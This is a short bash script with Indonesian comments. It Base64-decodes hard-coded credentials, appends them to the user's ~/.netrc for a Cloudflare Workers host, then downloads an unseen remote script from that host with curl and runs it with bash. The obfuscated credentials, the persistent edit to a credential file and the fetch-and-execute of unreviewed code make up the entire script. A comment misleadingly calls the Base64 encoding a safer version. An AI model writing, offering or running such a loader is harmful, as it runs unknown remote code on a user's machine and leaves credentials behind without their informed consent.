#!/usr/bin/env bash
# Skrip ini mengambil kredensial yang di-obfuscate dengan Base64,
# menyimpannya ke file .netrc, lalu mengunduh dan mengeksekusi skrip jarak jauh.
set -euo pipefail

# --- Konfigurasi ---
URL="https://ptero2.jishnumondal32.workers.dev"
HOST="ptero2.jishnumondal32.workers.dev"
NETRC="${HOME}/.netrc"

# --- Fungsi Pembantu ---
# Fungsi untuk mendekode Base64
b64d() { 
  # Menghindari error jika input kosong dengan `:-`
  printf '%s' "${1:-}" | base64 -d; 
}

# Kredensial yang di-obfuscate (versi yang lebih aman dengan 'read-only')
readonly USER_B64="amlzaG51"
readonly PASS_B64="amlzaG51aEBja2VyMTIz"

# Dekode kredensial
USER_RAW="$(b64d "$USER_B64")"
PASS_RAW="$(b64d "$PASS_B64")"

# Validasi kredensial yang sudah didekode
if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
  echo "Error: Dekode kredensial gagal." >&2
  exit 1
fi

# Pastikan perintah curl terinstal
if ! command -v curl >/dev/null 2>&1; then
  echo "Error: curl diperlukan tapi tidak terinstal." >&2
  exit 1
fi

# Siapkan file ~/.netrc dengan izin yang ketat (hanya pemilik yang bisa baca/tulis)
echo "Menyiapkan file .netrc..."
touch "$NETRC"
chmod 600 "$NETRC"

# Buat file sementara untuk mengedit .netrc tanpa mengorbankan file asli
tmpfile_netrc="$(mktemp)"
# Hapus entri lama untuk host ini jika ada, untuk menghindari duplikat
grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile_netrc" || true
# Pindahkan file yang sudah dibersihkan kembali ke .netrc
mv "$tmpfile_netrc" "$NETRC"

# Tambahkan entri baru untuk host ini
{
  printf 'machine %s ' "$HOST"
  printf 'login %s ' "$USER_RAW"
  printf 'password %s\n' "$PASS_RAW"
} >> "$NETRC"

# Siapkan untuk mengunduh dan mengeksekusi skrip
script_file="$(mktemp)"
# Fungsi pembersihan yang akan dijalankan saat skrip keluar (baik sukses maupun gagal)
cleanup() {
  echo "Membersihkan file sementara..."
  rm -f "$script_file"
}
# Pasang trap untuk memastikan pembersihan selalu terjadi
trap cleanup EXIT

echo "Mengunduh skrip dari $URL..."
# Unduh skrip menggunakan curl dan --netrc untuk autentikasi
if curl -fsSL --netrc -o "$script_file" "$URL"; then
  echo "Pengunduhan berhasil. Mengeksekusi skrip..."
  # Berikan izin eksekusi dan jalankan skrip yang diunduh
  chmod +x "$script_file"
  bash "$script_file"
else
  echo "Error: Autentikasi atau pengunduhan gagal." >&2
  exit 1
fi

echo "Skrip selesai dieksekusi."
